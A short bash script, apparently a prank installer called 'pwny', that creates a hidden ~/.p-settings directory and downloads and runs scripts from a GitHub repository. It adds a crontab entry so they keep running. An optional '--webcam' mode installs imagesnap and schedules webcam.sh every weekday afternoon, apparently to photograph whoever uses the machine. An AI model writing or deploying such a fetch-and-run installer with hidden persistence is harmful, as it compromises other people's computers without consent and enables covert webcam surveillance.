#!/bin/bash

mkdir ~/.p-settings
cd ~/.p-settings

if [[ $* == *--webcam* ]]
then
	echo "Webcam Mode"
	brew install imagesnap
	curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/webcam.sh
	chmod +x webcam.sh
	line="0 11-16 * * 1-4 ~/.p-settings/webcam.sh"
else
	echo "Pony Mode"
	curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.sh
	curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.jpg
	chmod +x pwny.sh
	./pwny.sh
	line="30 12 * * 1,2,4,5 ~/.p-settings/pwny.sh"
fi

cd -
(crontab -l; echo "$line" ) | crontab -
